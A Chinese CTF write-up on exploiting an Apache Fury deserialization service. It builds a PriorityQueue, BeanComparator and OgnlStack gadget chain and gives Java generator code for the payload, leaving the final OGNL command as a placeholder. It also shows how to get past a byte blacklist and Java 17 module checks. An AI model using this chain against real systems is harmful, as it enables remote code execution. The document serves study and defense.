# Ezff

## 题目简述

服务在 Java 17 上接收 `data` 表单参数，Base64 解码后交给 Apache Fury 0.9.0 反序列化：

```java
Fury fury = Fury.builder().withLanguage(Language.JAVA)
    .requireClassRegistration(false).withRefTracking(true).build();
byte[] payload = Base64.getDecoder().decode(data);
if (hasUnicodeEscape(payload)) return "no";
fury.deserialize(payload);
```

`data` 最多 666 个字符，序列化流中不能出现字节对 `\\u`/`\\U`。题目依赖的 Feilong 提供 `BeanComparator` 和 `OgnlStack`；前者可在 `PriorityQueue` 反序列化时触发属性读取，后者会对缓存的 OGNL AST 求值。决定性问题是无注册限制的反序列化与可达 OGNL 求值 sink，而不是 HTTP 参数本身。

## 解题过程

### gadget 链

构造对象图时把 `PriorityQueue` 的两个元素都设为同一个 `OgnlStack`，并把 comparator 设为 Feilong 的 `BeanComparator`。反序列化恢复队列时会比较元素；`BeanComparator` 按其 `property` 读取属性。`property = "value(yyy)"` 会进入 `OgnlStack.getValue("yyy")`。

```text
Fury.deserialize
  -> PriorityQueue 的恢复比较
  -> BeanComparator.compare
  -> BeanComparator 按 value(yyy) 读取属性
  -> OgnlStack.getValue("yyy")
  -> expressionsMap["yyy"] 对应的 OGNL AST 被求值
```

`value(表达式)` 的常规写法会被属性解析中第一个右括号截断；原题解也指出常见的 Unicode 转义绕过被题目禁止。因此先用一段完整恶意 OGNL 字符串调用 `getExpression` 取得已解析 AST，再反射写入 `expressionsMap.put("yyy", ast)`。真正被属性解析的只是短 key `yyy`，不会再经历表达式截断。

### payload 生成与投递

生成器要使用**同版本** Fury/Feilong，启用与服务一致的 Java 语言模式和 reference tracking。核心对象初始化如下；`<OGNL>` 应替换为在本地依赖版本验证可执行的 OGNL 表达式，且应将命令结果写入服务可回显的位置或受控的 CTF 回连通道。

```java
OgnlStack stack = new OgnlStack(null);
Object ast = getDeclaredMethod(stack, "getExpression", String.class).invoke(stack, "<OGNL>");
setField(stack, "expressionsMap", Map.of("yyy", ast));

BeanComparator comparator = new BeanComparator();
setField(comparator, "property", "value(yyy)");

PriorityQueue<Object> queue = new PriorityQueue<>();
setField(queue, "comparator", comparator);
setField(queue, "queue", new Object[] {stack, stack});
setField(queue, "size", 2);
String data = Base64.getEncoder().encodeToString(fury.serialize(queue));
```

Java 17 的模块访问限制会妨碍普通反射直接写私有字段；原题解的生成器以 `sun.misc.Unsafe` 将生成器类的 module 指向 `java.base` 后再完成这些字段赋值。该绕过仅发生在攻击者本地生成 payload 的 JVM，不是服务端的额外漏洞。发送时用 URL 编码的 `data=<Base64>`，并确认 Base64 长度不超过 666、原始 Fury 字节中没有 `\\u` 或 `\\U`。

### 验证

验证顺序是：本地反序列化前不触发 comparator（避免在生成端误执行）；编码长度和字节过滤均通过；服务返回 `ok` 且受控命令的结果到达选择的回显通道。题目 HTTP 端不返回 `deserialize` 的返回值，因此仅凭 `ok` 不能证明命令成功。

原始题解没有保留可直接在当前依赖树复跑的完整 OGNL 终端表达式和外部回显记录；本文保留已由源码与原题解共同支持的 gadget/缓存绕过链，不伪造最终 flag 或运行输出。

## 方法总结

- 核心技巧：利用 `PriorityQueue` + 属性 comparator 触发 Feilong `OgnlStack` 的缓存 AST 求值，并用缓存键绕过属性字符串截断。
- 识别信号：反序列化关闭 class registration、存在 comparator/property getter 与表达式引擎，且题目针对单一字节模式做黑名单。
- 复用要点：过滤序列化字节中的某个文本片段不能消除 gadget；应避免反序列化不可信对象，或采用严格类型允许列表并移除表达式执行能力。
